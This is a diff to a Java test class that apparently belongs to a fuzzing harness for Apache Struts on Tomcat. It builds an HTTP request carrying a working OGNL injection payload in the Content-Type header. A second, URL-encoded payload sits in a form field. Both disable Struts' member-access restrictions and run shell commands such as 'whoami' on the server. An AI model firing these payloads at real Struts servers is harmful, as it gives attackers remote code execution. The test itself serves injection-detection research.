@@ -138,11 +138,14 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                    "Content-Type: ${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" + "\r\n" +
 //                    "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
 
-            if(request.equals("TESTING_STRING_EQUALS!!!!")) {
-                System.out.println("path1!");
-            } else {
-                System.out.println("path2");
-            }
+
+
+
+//             if(request.equals("TESTING_STRING_EQUALS!!!!")) {
+//                System.out.println("path1!");
+//            } else {
+//                System.out.println("path2");
+//            }
             ProtocolHandler protocol = tomcat.getConnector().getProtocolHandler();
             AbstractHttp11Protocol<?> http11Protocol = (AbstractHttp11Protocol<?>) protocol;
             Http11Processor processor = new Http11Processor(http11Protocol, tomcat.getConnector().getProtocolHandler().getAdapter());
@@ -341,10 +344,14 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
 
-        String request = "POST /" + test.webapp_string + "/integration/saveGangster.action HTTP/1.1\r\n" +
-                "Host: any\r\n" +
-                //"Content-Type: ${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" + "\r\n" +
-                "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
+        String word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+
+
+   String  request = "POST /" + "struts2-showcase-2_3_10" + "/integration/saveGangster.action HTTP/1.1\r\n" +
+            "Host: any\r\n" +
+            "Content-Type:" + word + "\r\n" +
+            "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
+
 
 
         System.out.println(request);
